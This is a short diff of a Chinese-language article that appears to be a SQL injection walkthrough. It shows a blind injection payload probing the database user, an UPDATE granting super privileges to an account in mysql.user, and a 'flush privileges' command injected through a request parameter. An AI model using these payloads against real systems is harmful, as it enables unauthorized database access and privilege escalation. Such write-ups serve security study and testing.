@@ -228,7 +228,7 @@ select%20if((substr((select%20user()),1,1)=%27r%27),1,power(6666,666));
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HbXtibpZAvELhJaicaIiaQahvZDSFbfGnTq2GYrphw9FerVwNJghib3otXg/640?wx_fmt=png)
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HyrBk4ZosNb2pr7ia9VEWzou8cRGmjsvj25qRhzEVKUSjYXN59BgyjJw/640?wx_fmt=png)  
-发现添加成功了，这个时候我们就会给用户相应的权限，这里在数据库中进行对该用户赋予超级权限，UPDATE`mysql`.`user` SET `Super_priv` = ‘Y’ WHERE `User` = ‘test123’  
+发现添加成功了，这个时候我们就会给用户相应的权限，这里在数据库中进行对该用户赋予超级权限，UPDATE`mysql`.`user` SET `Super_priv` = ‘Y’ WHERE `User` = ‘test123’  
 接着我们在注入点进行权限的刷新 condition_cascade=flush privileges;
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoARhQ5GhJAK4QkovMz3g8HyOULN4E985kvBGPvVPuWQzeCbpJVn45Av02o8jQzziajUdUL8uB7Hwg/640?wx_fmt=png)  
